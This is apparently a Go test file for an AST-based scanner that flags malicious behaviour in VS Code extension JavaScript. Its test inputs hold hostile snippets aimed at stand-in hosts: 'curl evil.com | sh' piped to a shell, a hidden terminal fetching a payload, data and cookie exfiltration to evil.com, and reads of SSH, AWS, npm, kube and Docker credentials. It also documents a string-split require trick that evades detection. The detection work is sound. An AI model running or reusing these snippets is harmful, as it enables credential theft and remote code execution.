package astscanner_test

import (
	"testing"

	"github.com/dymchenkko/extwatch/internal/astscanner"
)

// ── helpers ──────────────────────────────────────────────────────────────────

// has reports whether any finding matches the given pattern name.
func has(findings []astscanner.Finding, pattern string) bool {
	for _, f := range findings {
		if f.Pattern == pattern {
			return true
		}
	}
	return false
}

// hasWithModule reports whether any finding matches pattern AND was resolved
// to the given module via the require() binding tracker.
func hasWithModule(findings []astscanner.Finding, pattern, module string) bool {
	for _, f := range findings {
		if f.Pattern == pattern && f.Module == module {
			return true
		}
	}
	return false
}

// hasWithSeverity reports whether any finding matches pattern at the given severity.
func hasWithSeverity(findings []astscanner.Finding, pattern string, sev astscanner.Severity) bool {
	for _, f := range findings {
		if f.Pattern == pattern && f.Severity == sev {
			return true
		}
	}
	return false
}

// onlyPattern asserts there is exactly one distinct pattern name in findings.
func onlyPattern(findings []astscanner.Finding, pattern string) bool {
	for _, f := range findings {
		if f.Pattern != pattern {
			return false
		}
	}
	return len(findings) > 0
}

// ── HIGH: code execution via child_process ────────────────────────────────────

// TestExecDirectImport is the baseline: a direct require + method call.
// Both regex and AST should catch this; it establishes that the happy path works.
func TestExecDirectImport(t *testing.T) {
	src := `
const cp = require('child_process');
cp.exec('whoami');
`
	f := astscanner.ScanFile("ext.js", src)
	if !hasWithModule(f, "exec(", "child_process") {
		t.Errorf("expected exec( resolved to child_process, got %+v", f)
	}
	if !hasWithSeverity(f, "exec(", astscanner.High) {
		t.Errorf("expected HIGH severity for exec(, got %+v", f)
	}
}

func TestExecSyncDirectImport(t *testing.T) {
	src := `
const cp = require('child_process');
cp.execSync('id');
`
	f := astscanner.ScanFile("ext.js", src)
	if !hasWithModule(f, "execSync(", "child_process") {
		t.Errorf("expected execSync( resolved to child_process, got %+v", f)
	}
}

func TestSpawnDirectImport(t *testing.T) {
	src := `
const cp = require('child_process');
cp.spawn('/bin/sh', ['-i']);
`
	f := astscanner.ScanFile("ext.js", src)
	if !hasWithModule(f, "spawn(", "child_process") {
		t.Errorf("expected spawn( resolved to child_process, got %+v", f)
	}
}

// TestExecBundlerAlias covers the case where a bundler emits multiple aliases
// for the same module in the same file. Regex catches this too (the string
// "child_process" is still present), but the AST approach does it correctly
// per-variable rather than relying on a file-wide text search.
func TestExecBundlerAlias(t *testing.T) {
	src := `
var cp10 = require('child_process');
var cp11 = require('child_process');
cp10.exec(cmd);
cp11.spawn('/bin/sh', ['-i']);
`
	f := astscanner.ScanFile("bundle.js", src)
	if !hasWithModule(f, "exec(", "child_process") {
		t.Errorf("expected exec( via cp10 alias, got %+v", f)
	}
	if !hasWithModule(f, "spawn(", "child_process") {
		t.Errorf("expected spawn( via cp11 alias, got %+v", f)
	}
}

// TestExecDestructured covers `const { exec } = require('child_process')`.
// The method is imported directly into a local name — both regex and AST
// need to follow the destructured binding.
func TestExecDestructured(t *testing.T) {
	src := `
const { exec, spawn } = require('child_process');
exec('curl evil.com | sh');
spawn('/bin/sh', ['-c', 'id']);
`
	f := astscanner.ScanFile("ext.js", src)
	if !hasWithModule(f, "exec(", "child_process") {
		t.Errorf("expected exec( from destructured import, got %+v", f)
	}
	if !hasWithModule(f, "spawn(", "child_process") {
		t.Errorf("expected spawn( from destructured import, got %+v", f)
	}
}

// ── HIGH: dynamic code evaluation ────────────────────────────────────────────

func TestEvalGlobal(t *testing.T) {
	src := `eval('require("child_process").exec("id")');`
	f := astscanner.ScanFile("ext.js", src)
	if !has(f, "eval(") {
		t.Errorf("expected eval( flagged, got %+v", f)
	}
	if !hasWithSeverity(f, "eval(", astscanner.High) {
		t.Errorf("expected HIGH severity for eval(, got %+v", f)
	}
}

func TestNewFunction(t *testing.T) {
	src := `const fn = new Function('return process.env');`
	f := astscanner.ScanFile("ext.js", src)
	if !has(f, "new Function(") {
		t.Errorf("expected new Function( flagged, got %+v", f)
	}
	if !hasWithSeverity(f, "new Function(", astscanner.High) {
		t.Errorf("expected HIGH severity for new Function(, got %+v", f)
	}
}

// TestVMRunInNewContext covers the vm module — an eval-equivalent that regex
// does not currently detect at all.
func TestVMRunInNewContext(t *testing.T) {
	src := `
const vm = require('vm');
vm.runInNewContext(userCode, sandbox);
`
	f := astscanner.ScanFile("ext.js", src)
	if !hasWithModule(f, "runInNewContext(", "vm") {
		t.Errorf("expected runInNewContext( resolved to vm module, got %+v", f)
	}
	if !hasWithSeverity(f, "runInNewContext(", astscanner.High) {
		t.Errorf("expected HIGH severity for vm.runInNewContext, got %+v", f)
	}
}

func TestVMRunInThisContext(t *testing.T) {
	src := `
const vm = require('vm');
vm.runInThisContext(src);
`
	f := astscanner.ScanFile("ext.js", src)
	if !hasWithModule(f, "runInThisContext(", "vm") {
		t.Errorf("expected runInThisContext( resolved to vm module, got %+v", f)
	}
}

// TestSetTimeoutStringEval covers setTimeout/setInterval with a string
// argument, which executes the string as code — an eval equivalent.
func TestSetTimeoutStringEval(t *testing.T) {
	src := `setTimeout("fetch('https://evil.com')", 0);`
	f := astscanner.ScanFile("ext.js", src)
	if !has(f, "setTimeout(string)") {
		t.Errorf("expected setTimeout with string arg flagged, got %+v", f)
	}
}

func TestSetIntervalStringEval(t *testing.T) {
	src := `setInterval("fetch('https://evil.com')", 1000);`
	f := astscanner.ScanFile("ext.js", src)
	if !has(f, "setInterval(string)") {
		t.Errorf("expected setInterval with string arg flagged, got %+v", f)
	}
}

// ── HIGH: credential and environment access ───────────────────────────────────

// TestProcessEnvDot is the baseline case that regex already catches.
func TestProcessEnvDot(t *testing.T) {
	src := `const token = process.env.GITHUB_TOKEN;`
	f := astscanner.ScanFile("ext.js", src)
	if !has(f, "process.env") {
		t.Errorf("expected process.env flagged, got %+v", f)
	}
}

// TestProcessEnvBracket is the case regex CANNOT catch.
// process['env'] uses bracket notation; the regex `process\.env` requires a
// literal dot and never matches.
func TestProcessEnvBracket(t *testing.T) {
	src := `const token = process['env']['AWS_SECRET_ACCESS_KEY'];`
	f := astscanner.ScanFile("ext.js", src)
	if !has(f, "process.env") {
		t.Errorf("expected process['env'] caught by AST (regex misses this), got %+v", f)
	}
}

// TestSSHCredentialPath checks that string literals referencing the SSH
// directory are flagged regardless of how they are constructed.
func TestSSHCredentialPath(t *testing.T) {
	src := `const key = fs.readFileSync(path.join(home, '.ssh', 'id_rsa'));`
	f := astscanner.ScanFile("ext.js", src)
	if !has(f, ".ssh") {
		t.Errorf("expected .ssh credential path flagged, got %+v", f)
	}
	if !hasWithSeverity(f, ".ssh", astscanner.High) {
		t.Errorf("expected HIGH severity for .ssh, got %+v", f)
	}
}

func TestAWSCredentialPath(t *testing.T) {
	src := `const creds = fs.readFileSync(home + '/.aws/credentials');`
	f := astscanner.ScanFile("ext.js", src)
	if !has(f, ".aws") {
		t.Errorf("expected .aws credential path flagged, got %+v", f)
	}
}

// TestNPMRCCredentialPath is a gap in the current regex catalogue.
// .npmrc contains npm auth tokens and is a high-value target.
func TestNPMRCCredentialPath(t *testing.T) {
	src := `const rc = fs.readFileSync(path.join(home, '.npmrc'), 'utf8');`
	f := astscanner.ScanFile("ext.js", src)
	if !has(f, ".npmrc") {
		t.Errorf("expected .npmrc credential path flagged (gap in regex), got %+v", f)
	}
	if !hasWithSeverity(f, ".npmrc", astscanner.High) {
		t.Errorf("expected HIGH severity for .npmrc, got %+v", f)
	}
}

func TestKubeconfigPath(t *testing.T) {
	src := `const cfg = fs.readFileSync(home + '/.kube/config');`
	f := astscanner.ScanFile("ext.js", src)
	if !has(f, ".kube") {
		t.Errorf("expected .kube credential path flagged (gap in regex), got %+v", f)
	}
}

func TestDockerConfigPath(t *testing.T) {
	src := `const cfg = JSON.parse(fs.readFileSync(home + '/.docker/config.json'));`
	f := astscanner.ScanFile("ext.js", src)
	if !has(f, ".docker") {
		t.Errorf("expected .docker credential path flagged (gap in regex), got %+v", f)
	}
}

// ── MEDIUM: network exfiltration ─────────────────────────────────────────────

func TestFetchGlobal(t *testing.T) {
	src := `fetch('https://evil.com/exfil?d=' + stolen);`
	f := astscanner.ScanFile("ext.js", src)
	if !has(f, "fetch(") {
		t.Errorf("expected fetch( flagged, got %+v", f)
	}
	if !hasWithSeverity(f, "fetch(", astscanner.Medium) {
		t.Errorf("expected MEDIUM severity for fetch(, got %+v", f)
	}
}

// TestHTTPSModule covers exfiltration via Node's native https module —
// currently absent from the regex catalogue entirely.
func TestHTTPSModule(t *testing.T) {
	src := `
const https = require('https');
https.request({ host: 'evil.com', path: '/steal' }, cb).end();
`
	f := astscanner.ScanFile("ext.js", src)
	if !hasWithModule(f, "https.request(", "https") {
		t.Errorf("expected https.request( resolved to https module (gap in regex), got %+v", f)
	}
}

// TestHTTPModule covers the http variant.
func TestHTTPModule(t *testing.T) {
	src := `
const http = require('http');
http.request('http://evil.com', cb);
`
	f := astscanner.ScanFile("ext.js", src)
	if !hasWithModule(f, "http.request(", "http") {
		t.Errorf("expected http.request( resolved to http module (gap in regex), got %+v", f)
	}
}

// TestNetModule covers raw TCP exfiltration — also absent from regex catalogue.
func TestNetModule(t *testing.T) {
	src := `
const net = require('net');
const sock = net.createConnection({ port: 4444, host: 'evil.com' });
`
	f := astscanner.ScanFile("ext.js", src)
	if !hasWithModule(f, "createConnection(", "net") {
		t.Errorf("expected createConnection( resolved to net module (gap in regex), got %+v", f)
	}
}

func TestWebSocketNew(t *testing.T) {
	src := `const ws = new WebSocket('wss://evil.com/c2');`
	f := astscanner.ScanFile("ext.js", src)
	if !has(f, "WebSocket") {
		t.Errorf("expected WebSocket flagged, got %+v", f)
	}
}

// TestXMLHttpRequest covers XHR — absent from the current regex catalogue.
func TestXMLHttpRequest(t *testing.T) {
	src := `
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://evil.com/collect');
xhr.send(document.cookie);
`
	f := astscanner.ScanFile("ext.js", src)
	if !has(f, "XMLHttpRequest") {
		t.Errorf("expected XMLHttpRequest flagged (gap in regex), got %+v", f)
	}
}

// TestVSCodeTerminal covers vscode.window.createTerminal — a VS Code API
// that runs shell commands and is completely absent from the regex catalogue.
func TestVSCodeTerminal(t *testing.T) {
	src := `
const vscode = require('vscode');
const term = vscode.window.createTerminal({ name: 'updater', hideFromUser: true });
term.sendText('curl https://evil.com/payload | sh');
`
	f := astscanner.ScanFile("ext.js", src)
	if !hasWithModule(f, "createTerminal(", "vscode") {
		t.Errorf("expected createTerminal( resolved to vscode module (gap in regex), got %+v", f)
	}
	if !hasWithSeverity(f, "createTerminal(", astscanner.High) {
		t.Errorf("expected HIGH severity for createTerminal(, got %+v", f)
	}
}

// ── Negative tests: things that must NOT be flagged ───────────────────────────

// TestRegexpExecNotFlagged is the classic false-positive from minified libs
// like d3 where RegExp.prototype.exec() looks like a shell exec to a regex
// scanner. The AST knows the receiver is a regex, not child_process.
func TestRegexpExecNotFlagged(t *testing.T) {
	src := `
const re = /foo/g;
const m = re.exec(input);
arr.forEach(x => x.exec(pattern));
`
	f := astscanner.ScanFile("lib.js", src)
	if hasWithModule(f, "exec(", "child_process") {
		t.Errorf("RegExp.exec() must not be flagged as child_process exec, got %+v", f)
	}
}

// TestSetTimeoutFunctionNotFlagged ensures setTimeout with a *function*
// argument (the normal, safe usage) is not flagged.
func TestSetTimeoutFunctionNotFlagged(t *testing.T) {
	src := `setTimeout(() => doWork(), 100);`
	f := astscanner.ScanFile("ext.js", src)
	if has(f, "setTimeout(string)") {
		t.Errorf("setTimeout with function arg must not be flagged, got %+v", f)
	}
}

// TestFetchAsVariableNameNotFlagged ensures that a variable named `fetch`
// that is never called doesn't produce a finding.
func TestFetchAsVariableNameNotFlagged(t *testing.T) {
	src := `const fetch = require('node-fetch');` // assignment, no call
	f := astscanner.ScanFile("ext.js", src)
	// We expect fetch( only when it's called. Binding alone is not a finding.
	if has(f, "fetch(") {
		t.Errorf("merely binding fetch must not produce a finding, got %+v", f)
	}
}

// ── Documented blind spots ────────────────────────────────────────────────────

// TestStringSplitRequireEvades documents that splitting the module name across
// string concatenation defeats the require() tracker. This is a known
// limitation shared by both regex and AST static analysis. The test asserts
// that we do NOT detect it — so that the moment an implementation starts
// catching this (e.g. via taint analysis), the test update is deliberate.
func TestStringSplitRequireEvades(t *testing.T) {
	src := `
const cp = require('child' + '_process');
cp.exec('id');
`
	f := astscanner.ScanFile("ext.js", src)
	if hasWithModule(f, "exec(", "child_process") {
		t.Errorf("string-split require should NOT be resolved by static analysis: "+
			"if this now passes, verify it is genuine taint analysis and update this comment. got %+v", f)
	}
}

// TestLineNumbers checks that findings carry accurate 1-based line numbers,
// which are used by the reporter to point the user at the exact location.
func TestLineNumbers(t *testing.T) {
	src := "const cp = require('child_process');\ncp.exec('id');\n"
	//      line 1 ─────────────────────────────  line 2 ──────────

	f := astscanner.ScanFile("ext.js", src)
	for _, finding := range f {
		if finding.Pattern == "exec(" {
			if finding.Line != 2 {
				t.Errorf("exec( expected on line 2, got line %d", finding.Line)
			}
			return
		}
	}
	t.Errorf("exec( finding not present at all, got %+v", f)
}

// TestSnippetPresent checks that each finding carries a non-empty snippet
// (the trimmed source line), used by the reporter for display.
func TestSnippetPresent(t *testing.T) {
	src := `const cp = require('child_process');
cp.exec('id');`
	f := astscanner.ScanFile("ext.js", src)
	for _, finding := range f {
		if finding.Snippet == "" {
			t.Errorf("finding %q has empty snippet", finding.Pattern)
		}
	}
}
